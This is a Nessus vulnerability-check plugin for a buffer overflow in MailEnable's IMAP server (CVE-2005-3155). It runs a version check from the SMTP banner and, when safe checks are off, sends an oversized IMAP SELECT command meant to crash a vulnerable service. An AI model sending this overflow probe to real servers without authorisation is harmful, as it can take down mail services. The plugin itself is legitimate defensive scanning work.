#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(19783);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2011/04/20 01:55:04 $");

  script_cve_id("CVE-2005-3155");
  script_bugtraq_id(15006);
  script_osvdb_id(19842);

  script_name(english:"MailEnable IMAP Server W3C Logging Overflow");
  script_summary(english:"Checks for logging buffer overflow vulnerability in in MailEnable's IMAP service");

  script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is prone to a buffer overflow attack." );
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of MailEnable's IMAP service
that is prone to a buffer overflow attack involving its handling of
W3C logging.  An attacker may be able to exploit this to execute
arbitrary code subject to the privileges of the affected application,
typically Administrator." );
  script_set_attribute(attribute:"see_also", value:"http://forum.mailenable.com/viewtopic.php?t=8555" );
  script_set_attribute(attribute:"see_also", value:"http://www.mailenable.com/hotfix/" );
  script_set_attribute(attribute:"solution", value:
"Apply the 3 October 2005 IMAP Rollup Critical Update/Performance
Improvement Hotfix referenced in the vendor advisory above." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'MailEnable IMAPD W3C Logging Buffer Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value: "2005/10/04");
  script_set_attribute(attribute:"vuln_publication_date", value: "2005/10/03");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mailenable:mailenable");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_dependencie("smtpserver_detect.nasl", "imap4_banner.nasl");
  script_exclude_keys("imap/false_imap");
  script_require_ports("Services/smtp", 25, "Services/imap", 143);

  exit(0);
}

include("global_settings.inc");
include("imap_func.inc");
include("smtp_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


# Make sure the banner is for MailEnable.
banner = get_imap_banner(port:port);
if (!banner || "* OK IMAP4rev1 server ready" >!< banner) exit(0);


# If safe checks are enabled...
if (safe_checks()) {
  # nb: we'll won't do a banner check unless report_paranoia is 
  #     set to paranoid since the hotfix doesn't update the banner.
  if (report_paranoia <= 1) exit(0);

  # Check the version number from the SMTP server's banner.
  smtp_port = get_kb_item("Services/smtp");
  if (!smtp_port) smtp_port = 25;
  if (!get_port_state(smtp_port)) exit(0);
  if (get_kb_item('SMTP/'+smtp_port+'/broken')) exit(0);

  banner = get_smtp_banner(port:smtp_port);
  if (banner =~ "Mail(Enable| Enable SMTP) Service") {
    # nb: Standard Edition seems to format version as "1.71--" (for 1.71),
    #     Professional Edition formats it like "0-1.2-" (for 1.2), and
    #     Enterprise Edition formats it like "0--1.1" (for 1.1).
    ver = eregmatch(
      pattern:"Version: (0-+)?([0-9][^- ]+)-*",
      string:banner,
      icase:TRUE
    );
    if (ver == NULL) {
      exit(1, "cannot determine version of MailEnable's SMTP connector service");
    }
    if (ver[1] == NULL) {
      edition = "Standard";
    }
    else if (ver[1] == "0-") {
      edition = "Professional";
    }
    else if (ver[1] == "0--") {
      edition = "Enterprise";
    }
    if (isnull(edition)) {
      exit(1, "cannot determine edition of MailEnable's SMTP connector service!");
    }
    ver = ver[2];

    if (
      # nb: Professional versions <= 1.6 may be vulnerable.
      (edition == "Professional" && ver =~ "^1\.([0-5]|6$)") ||
      # nb: Enterprise versions <= 1.2 may be vulnerable.
      (edition == "Enterprise" && ver =~ "^1\.(0|1$)")
    ) {
      w = string(
          "***** Nessus has determined the vulnerability exists on the remote\n",
          "***** host simply by looking at the version number of Mailenable\n",
          "***** installed there. Since the Hotfix does not change the version\n",
          "***** number, though, this might be a false positive.\n");
      security_hole(port:port, extra: w);
    }
  }
 exit(0);
}
# Otherwise, try to exploit it.
else {
  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Read banner.
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s)) {
    close(soc);
    exit(0);
  }

  # Try to exploit the flaw.
  #
  # nb: a vulnerable server will respond with a bad command and die after a few seconds.
  ++tag;
  c = string("nessus", string(tag), " SELECT ", crap(6800));
  send(socket:soc, data:string(c, "\r\n"));
  close(soc);
  sleep(5);

  # Try to reestablish a connection and read the banner.
  soc2 = open_sock_tcp(port);
  if (soc2) s2 = recv_line(socket:soc2, length:1024);

  # There's a problem if we couldn't establish the connection or read the banner.
  if (!soc2 || !strlen(s2)) {
    security_hole(port);
    exit(0);
  }
  close(soc2);
}
